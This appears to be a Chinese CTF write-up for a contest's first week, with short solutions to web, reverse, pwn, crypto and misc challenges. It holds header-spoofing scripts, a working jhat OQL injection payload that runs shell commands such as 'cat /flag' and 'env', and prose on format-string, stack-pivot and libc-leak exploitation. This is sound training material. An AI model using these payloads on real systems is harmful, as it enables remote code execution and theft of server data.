# WEEK1
## WEB
### 2048
```javascript
(function(){}).constructor === Function
Function.prototype.constructor = function(){}
```
反调
![](https://pic.imgdb.cn/item/65ba1d4d871b83018a720301.png)
改个score won就行
### http
```python
import requests

url = 'http://47.100.137.175:30417/'
referer = 'vidar.club'
referer2='127.0.0.1'
headers = {
    'User-Agent':'Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    'Referer': referer,
    'X-Real-IP': '127.0.0.1'
}

response = requests.get(url, headers=headers)

print(response.text)
```
### bypass
藏了一个registe.php  ，恶心
不是给的register_xxx_.php
```python
import requests

url = "http://47.100.137.175:30195/register.php"  
data = {
    "username": "12345",
    "password": "12345",
    "register": "注册"}

response = requests.post(url, data=data)
print(response.text)
```
### select cource
应该是原型链污染，但是不知道出题人咋写的题，点一点就出
### jhat
oql注入，没有waf
function带出数据
java.lang.Runtime.getRuntime().exec("env").getInputStream();
```java
   select map(heap.objects('java.lang.ClassLoader'),
      function (it) {
         var res = '';
         var ex = java.lang.Runtime.getRuntime().exec("cat /flag").getInputStream();
         var isr = new java.io.InputStreamReader(ex);
         var br = new java.io.BufferedReader(isr);
         while (it != null) {
            res += toHtml(it) + "->";
            it = it.parent;
         }
         res += br.readLine();
         return res + "<br>";
      })
```

## REVERSE
### ezASM
每个数据异或0x22。
### ezPYC
pyinstxtractor解包之后反编译pyc文件。但是出来的内容不全。
根据加密之后的末两位是124, 2以及flag的末两位应当为`}`以及`\x00`，推断加密为循环异或1,2,3,4。
### ezIDA
拖入IDA即可。
### ezUPX
`upx -d`脱壳，每一位异或0x32。

## PWN
### EzSignIn
连上就行。
### ezshellcode
用-1绕过长度检查，再在网上找一个课件shellcode即可。
### ezfmt string
现在本地将过滤字符的代码patch掉泄露栈上内容。
构造payload时先将栈上第18个参数的最后两字节改为`\x08`，再利用`%xc%22$hn`修改第22个参数位后门函数地址。
不停地打，直到某一次第22个参数的地址以`\x08`结尾，即可成功。
### Elden Ring I
利用栈溢出和puts函数泄露libc基址。
由于题目有沙箱，通过libc中的指令组pop_rsp_ret将栈迁移到bss段。之后执行orw。
### Elden Random Challenge
输入名字的时候将seed覆盖为0即可人工控制随机数。
之后利用栈溢出和puts函数泄露libc基址，找到system函数和/bin/sh字符串地址拿到shell。

## CRYPTO
### 奇怪的图片
选定一张图片A，让其余的图片都跟A异或，可以得到一组写有flag的图片。
将这一组图片上的字数从小到大排列即可找出flag。
其中在A上写的字以前的图片需要倒着排列。
### ezRSA
根据费马小定理，泄露出来的leak1和leak2其实就是p和q。
### ezPRNG
每次迭代在后面添加的数会同时被添加到output中，迭代32次之后，就是在使用output中的内容了。
迭代规则中掩码为1的位置数据也是1的情况有奇数个就补1，反之补0，据此还原。
### ezMath
佩尔方程。网上随便搜一个脚本就行。

## MISC
### 来自星尘的问候
用steghide猜密码123456提取出压缩包，压缩包中的图片用脑残游戏文字对照出来就是flag
### 希儿希儿希尔
foremost出来zip得到密文，LSB隐写得到密钥矩阵，用希尔密码解密出来就是flag
### simple_attack
已知明文攻击，bkcrack秒了
### 签到
签到
### signin
平着看